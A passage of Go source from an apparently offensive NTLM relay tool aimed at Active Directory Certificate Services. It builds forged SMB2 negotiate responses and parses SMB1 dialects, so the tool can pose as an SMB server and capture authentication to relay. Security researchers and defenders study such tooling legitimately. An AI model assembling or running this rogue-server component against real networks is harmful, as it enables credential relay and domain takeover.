	binary.LittleEndian.PutUint64(response[offset:offset+8], 0)
	offset += 8
	offset += 16

	binary.LittleEndian.PutUint16(response[offset:offset+2], 65)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid)
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8

	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128))
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob)))
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)

	response = append(response[:128], securityBlob...)

	return response
}

// buildSMB2NegotiateResponse builds an SMB2 NEGOTIATE response for direct SMB2 requests
func (h *ADCSRelayHandler) buildSMB2NegotiateResponse(header *smb.SMB2Header) []byte {
	response := make([]byte, 128)
	offset := 0

	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], header.MessageID)
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0)
	offset += 8
	offset += 16

	binary.LittleEndian.PutUint16(response[offset:offset+2], 65)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid)
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8

	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128))
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob)))
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)

	response = append(response[:128], securityBlob...)

	return response
}

// parseSMB1Dialects parses dialect strings from SMB1 NEGOTIATE
func (h *ADCSRelayHandler) parseSMB1Dialects(packet []byte) ([]string, error) {
	if len(packet) < 35 {
		return nil, fmt.Errorf("packet too short")
	}

	wordCount := packet[32]
	if wordCount != 0 {
		return nil, fmt.Errorf("unexpected WordCount: %d", wordCount)
	}

	byteCount := binary.LittleEndian.Uint16(packet[33:35])
	if len(packet) < 35+int(byteCount) {
		return nil, fmt.Errorf("packet too short for ByteCount")
	}

	var dialects []string
	offset := 35
	end := 35 + int(byteCount)

	for offset < end {
		if packet[offset] != 0x02 {
			break
		}
		offset++

		start := offset
		for offset < end && packet[offset] != 0 {
			offset++
		}

		dialect := string(packet[start:offset])
		dialects = append(dialects, dialect)
		offset++
	}

	return dialects, nil
}
